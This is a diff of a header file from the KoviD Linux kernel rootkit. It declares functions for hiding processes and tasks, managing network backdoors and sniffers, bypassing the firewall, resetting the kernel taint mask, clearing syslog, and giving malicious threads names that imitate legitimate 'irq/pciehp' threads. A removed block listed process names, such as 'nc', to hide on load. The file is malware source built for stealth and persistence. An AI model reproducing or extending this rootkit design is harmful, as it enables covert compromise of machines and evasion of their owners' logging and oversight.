@@ -1,9 +1,5 @@
-/**
- * Linux Kernel version <= 5.5.0
- * - hash
- *
- *  KoviD rootkit
- */
+//  KoviD rootkit
+//  - hash
 
 #ifndef __KERNEL_ADDR_H
 #define __KERNEL_ADDR_H
@@ -15,31 +11,26 @@
 #define THREAD_PROC_NAME "irq/100_pciehp"
 #define THREAD_SOCK_NAME "irq/101_pciehp"
 #define THREAD_SNIFFER_NAME "irq/102_pciehp"
-#define THREAD_TAINTED_NAME "irq/103_pciehp"
+#define THREAD_POST_LOADING "irq/103_pciehp"
 
-typedef enum { CHILDREN, NO_CHILDREN, WHATEVER } Operation;
+#define PROCNAME_FULL "/proc/" PROCNAME
 
 struct hidden_tasks {
 	struct task_struct *task;
 
-	/** FS associated with task
-     * NULL if kernel thread
-     */
+	// FS associated with task
+	// NULL if kernel thread
 	struct fs_file_node *fnode;
 
-	/**
-     * backdoor tasks cannot
-     * be left hanging around
-     */
+	// backdoor tasks cannot
+	// be left hanging around
 	int select;
 
 	struct list_head list;
 	pid_t group;
 
-	/**
-     * It is backdoor task
-     * if source address != 0
-     */
+	// It is backdoor task
+	// if source address != 0
 	__be32 saddr;
 };
 
@@ -61,6 +52,8 @@ typedef struct bpf_map *(*bpf_map_get_sg)(unsigned int);
 typedef struct bpf_map *(*bpf_map_get_sg)(struct fd);
 #endif
 
+typedef int (*do_syslog_sg)(int, char __user *, int, int);
+
 typedef unsigned long (*kallsyms_lookup_name_sg)(const char *name);
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
@@ -74,6 +67,7 @@ typedef void (*do__set_task_comm_sg)(struct task_struct *, const char *, bool);
 struct kernel_syscalls {
 	attach_pid_sg k_attach_pid;
 	bpf_map_get_sg k_bpf_map_get;
+	do_syslog_sg k_do_syslog;
 	kallsyms_lookup_name_sg k_kallsyms_lookup_name;
 	sys64 k_sys_setreuid;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
@@ -85,7 +79,7 @@ struct kernel_syscalls {
 
 typedef void (*decrypt_callback)(const u8 *const buf, size_t buflen,
 				 size_t copied, void *userdata);
-/** Setup crypto module */
+// Setup crypto module
 int kv_crypto_engine_init(void);
 struct kv_crypto_st *kv_crypto_mgc_init(void);
 size_t kv_encrypt(struct kv_crypto_st *, u8 *, size_t);
@@ -94,36 +88,36 @@ void kv_crypto_free_data(struct kv_crypto_st *);
 void kv_crypto_mgc_deinit(struct kv_crypto_st *);
 void kv_crypto_engine_deinit(void);
 
-/** hooks, hiding presence and so */
+// hooks, hiding presence and so
 bool sys_init(void);
 void sys_deinit(void);
+int sys_do_syslog_clear(void);
 char *sys_get_ttyfile(void);
 char *sys_get_sslfile(void);
 
-/** pid,task management */
+// pid,task management
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
 bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid);
 bool kv_find_hidden_task(struct task_struct *);
-void kv_hide_task_by_pid(pid_t, __be32, Operation);
+int kv_hide_task_by_pid(pid_t, __be32, bool);
 void kv_unhide_task_by_pid_exit_group(pid_t pid);
 bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct *, void *),
 				      void *);
 bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
 void kv_reload_hidden_task(struct task_struct *task);
 void kv_pid_cleanup(void);
-void kv_rename_task(pid_t, const char *);
+int kv_rename_task(pid_t, const char *);
 void kv_show_saved_tasks(void);
 void kv_show_all_tasks(void);
-void kv_scan_and_hide(void);
-void kv_send_signal(int, struct task_struct *);
+int kv_send_signal(int, struct task_struct *);
 
-/** syscall,function addresses */
+// syscall,function addresses
 struct kernel_syscalls *kv_kall_load_addr(void);
 
-/** resets tainted_mask */
-void kv_reset_tainted(unsigned long *);
+// resets tainted_mask
+int kv_reset_tainted(unsigned long *);
 
-/** socket,networking,backdoor management */
+// socket,networking,backdoor management
 struct task_struct *kv_sock_start_sniff(void);
 bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
@@ -137,60 +131,26 @@ void kv_show_active_backdoors(void);
 bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
 
-/** proc handling */
+// proc handling
 int kv_add_proc_interface(void);
 void kv_remove_proc_interface(void);
 int kv_is_proc_interface_loaded(void);
+void kv_set_elfbits(char *);
 
-/** whatever */
 char *kv_util_random_AZ_string(size_t);
-int kv_run_system_command(char **);
+int kv_run_system_command(char **, bool, bool);
 
-/** VM operations */
+// VM operations
 unsigned long kv_get_elf_vm_start(pid_t);
 
 enum {
 	KV_TASK,
-	/* The following indicates a backdoor
-     * task that can also hide its
-     * tcp traffic
-     */
+
+	// The following indicates a backdoor
+	// task that can also hide its
+	// tcp traffic
 	KV_TASK_BD
 };
-
-struct _kv_hide_ps_on_load {
-	const char *name;
-	int type;
-};
-
-/*
-  * Hide these process names at insmod
- */
-static struct _kv_hide_ps_on_load kv_hide_ps_on_load[] = {
-
-	// Uncomment, recompile and try nc:
-	//{"nc", KV_TASK_BD},
-
-	{ NULL, -1 },
-};
-
-/*
- * Helper that returns the list of names to hide on load
- */
-static inline const char **kv_get_hide_ps_names(void)
-{
-	// XXX: using fixed maxsize kv_hide_ps_on_load for now
-	static const char *names[32];
-	if (!*names) {
-		int i = 0;
-		size_t maxnames = sizeof(names) / sizeof(*names);
-		for (; i < maxnames && kv_hide_ps_on_load[i].name != NULL;
-		     ++i) {
-			names[i] = kv_hide_ps_on_load[i].name;
-		}
-	}
-	return names;
-}
 
 // PP_NARG from
 // https://groups.google.com/forum/#!topic/comp.std.c/d-6Mj5Lko_s
